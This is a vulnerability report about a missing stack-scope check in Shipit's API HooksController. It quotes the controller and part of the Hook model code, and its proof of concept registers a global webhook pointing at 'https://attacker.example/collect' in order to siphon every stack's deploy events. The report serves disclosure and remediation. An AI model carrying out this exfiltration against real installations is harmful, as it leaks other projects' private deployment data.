Found it: `HooksController#hooks` in the API scopes queries by `stack_id`, but a stack-scoped `ApiClient` (one with `stack_id` set) is never restricted to that stack when calling `POST /api/hooks` (the non-nested route). This breaks the "stack a token authorises versus a stack it touches" binding, because `write:hook` permission is checked in isolation, without validating that the client's `stack_id` (if any) matches the target hook's scope.

### Title
Stack-scoped API client can create/read/modify global hooks that fire for every stack - (File: app/controllers/shipit/api/hooks_controller.rb)

### Summary
`Shipit::Api::HooksController` gates hook mutation solely on the `write:hook`/`read:hook` permission bits of the authenticated `ApiClient`, but never checks whether that client is scoped to a specific stack (`ApiClient#stack_id`). Because both `/api/hooks` (global) and `/api/stacks/*stack_id/hooks` (scoped) route to the same controller, an `ApiClient` created with `stack_id` set to one stack, and granted `write:hook`, can hit the unscoped `/api/hooks` endpoint and create/update/destroy a **global** hook (`stack_id: nil`) that receives events for every stack in the Shipit instance.

### Finding Description
`ApiClient#stack_id` is meant to scope a token to a single stack: `BaseController#stacks` restricts stack lookups to `Stack.where(id: current_api_client.stack_id)` when `stack_id?` is true. [1](#0-0) 

`HooksController`, however, only enforces the operation/scope permission pair (`write:hook`, `read:hook`) via `require_permission`, and computes the hook scope purely from the URL params, not from `current_api_client.stack_id`: [2](#0-1) 

```ruby
def hooks
  Hook.where(stack_id:)
end

def stack_id
  stack.id if params[:stack_id].present?
end
```

Both routes dispatch to this controller: [3](#0-2) 

Because `create`/`update`/`destroy` never call `stack` (which is the only place `current_api_client.stack_id` restriction is applied) when `params[:stack_id]` is absent, a client scoped to `stack_id: X` can call the top-level `/api/hooks` endpoint and manipulate `Hook.where(stack_id: nil)`, i.e. global hooks, as confirmed by the test asserting `#index without a stack_id returns the list of global hooks`. [4](#0-3) 

The equality that should hold is: `stack the ApiClient is authorized for == stack whose hook is created/read/updated/destroyed`. In practice, for a client with a non-nil `stack_id`, calling `/api/hooks` breaks this: the authorized stack is `X`, but the touched hook scope is "all stacks" (global).

### Impact Explanation
A hook can carry an outbound delivery URL and (for internal hooks) drives `EmitEventJob`; a global hook is delivered for every `deploy`, `rollback`, `merge`, `lock`, `task`, etc. event across the whole Shipit install (see `Hook::EVENTS` and `Hook.deliver`/`Hook.emit`). [5](#0-4) 
A holder of a single-stack, low-trust `write:hook` credential (e.g. a CI integration meant only to see one repository's deploy events) can register a global outbound webhook whose URL they control, causing every other stack's deploy/task/rollback event data (commit shas, users, output links) to be exfiltrated to an attacker-controlled endpoint — a cross-stack information disclosure that the `ApiClient.stack_id` scoping was explicitly designed to prevent.

### Likelihood Explanation
Exploitation requires only an already-issued `ApiClient` token scoped to one stack with the `write:hook` permission — a plausible, low-privilege credential grant (e.g. handed to a build/CI system for a single project). No GitHub write access, no admin session, and no signature/secret knowledge is needed; only the `Authorization: Basic <token>` credential for that one client is required, and the flaw is a straightforward missing scope check reachable on every request to `/api/hooks`.

### Recommendation
In `HooksController`, when the `ApiClient` is stack-scoped (`current_api_client.stack_id?`), reject or auto-restrict access to the unscoped `/api/hooks` route entirely (e.g. `stacks.from_param!` should be exercised even for the top-level route, or explicitly `raise ApiClient::InsufficientPermission` when `current_api_client.stack_id?` and `params[:stack_id]` is blank). At minimum, `hooks`/`hook`/`stack_id` should validate `current_api_client.stack_id.nil? || current_api_client.stack_id == stack&.id` before returning any `Hook` records.

### Proof of Concept
1. Create `ApiClient A` with `stack_id: stacks(:shipit).id` and `permissions: ['write:hook']`.
2. Authenticate as `A` and `POST /api/hooks` with `delivery_url: 'https://attacker.example/collect', events: ['deploy','task','merge']` (no `stack_id` in the path).
3. `HooksController#create` executes `hooks.create(params)` where `hooks` resolves to `Hook.where(stack_id: nil)` because `params[:stack_id]` is absent, creating a **global** `Hook` unrelated to the stack the client is scoped to.
4. Any subsequent `deploy`/`task`/`merge` event on **any** stack in the installation is now delivered to `https://attacker.example/collect`, even though client `A`'s token should only see events for its one authorized stack.

module Shipit
  module Api
    class HooksController < BaseController
      require_permission :read, :hook, only: %i[index show]
      require_permission :write, :hook, only: %i[create update destroy]

      def index
        render_resources(hooks)
      end

      def show
        render(json: hook)
      end

      params do
        requires :delivery_url, String
        requires :events, Array[String]
        accepts :content_type, String
      end
      def create
        render_resource(hooks.create(params))
      end

      params do
        accepts :delivery_url, String
        accepts :events, Array[String]
        accepts :content_type, String
      end
      def update
        hook.update(params)
        render_resource(hook)
      end

      def destroy
        render_resource(hook.destroy)
      end

      private

      def hook
        hooks.find(params[:id])
      end

      def hooks
        Hook.where(stack_id:)
      end

    EVENTS = %w[
      stack
      review_stack
      task
      deploy
      rollback
      lock
      commit_status
      deployable_status
      merge_status
      merge
      pull_request
    ].freeze

    belongs_to :stack, required: false
    has_many :deliveries

    validates :delivery_url, presence: true, url: { no_local: true, allow_blank: true }
    validates :content_type, presence: true, inclusion: { in: CONTENT_TYPES.keys }
    validates :events, presence: true, subset: { of: EVENTS }

    serialize :events, coder: Shipit::CSVSerializer

    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
